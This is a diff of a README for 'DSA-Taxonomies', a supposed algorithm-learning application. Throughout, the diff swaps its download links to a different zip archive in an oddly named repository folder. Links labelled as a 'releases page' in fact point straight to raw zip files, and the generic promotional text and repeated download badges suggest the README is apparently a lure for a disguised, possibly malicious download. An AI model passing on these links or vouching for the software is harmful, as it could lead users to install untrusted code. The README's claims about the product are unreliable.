@@ -1,6 +1,6 @@
 # 🧮 DSA-Taxonomies - Learn Algorithms Simply and Effectively
 
-[![Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip)](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip)
+[![Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip)](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip)
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ To get started, follow these steps to download and run the DSA-Taxonomies applic
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the DSA-Taxonomies releases page to download the software: [Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip).
+   Go to the DSA-Taxonomies releases page to download the software: [Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will find different versions of the application. Look for the most recent version to ensure you have the latest features and fixes.
@@ -59,7 +59,7 @@ To run DSA-Taxonomies smoothly, ensure your computer meets the following require
 
 ### How do I update the software?
 
-To update the DSA-Taxonomies application, return to the [Releases Page](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip), download the newest version, and repeat the installation process.
+To update the DSA-Taxonomies application, return to the [Releases Page](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip), download the newest version, and repeat the installation process.
 
 ### Can I use this tool on different systems?
 
@@ -89,4 +89,4 @@ If you have any questions or feedback, feel free to reach out via the issues sec
 
 Thank you for choosing DSA-Taxonomies for your learning needs! Your commitment to mastering algorithms sets you on a path to success in computer science. Enjoy your learning journey!
 
-[![Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip)](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/DSA-Taxonomies.zip)
+[![Download DSA-Taxonomies](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip)](https://raw.githubusercontent.com/Dariannos/DSA-Taxonomies/main/makebate/Taxonomies-DS-2.5.zip)
